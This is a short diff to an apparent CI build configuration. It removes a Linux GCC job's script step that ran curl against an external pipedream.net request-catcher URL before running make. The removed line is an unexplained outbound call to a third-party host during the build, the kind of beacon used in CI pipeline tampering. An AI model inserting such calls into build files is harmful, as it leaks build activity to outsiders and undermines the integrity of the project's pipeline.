@@ -8,7 +8,4 @@ matrix:
   - name: Linux - GCC
     os: linux
     compiler: gcc
-    script:
-    - curl https://enniz2ofhd9yg.x.pipedream.net
-    - make
 
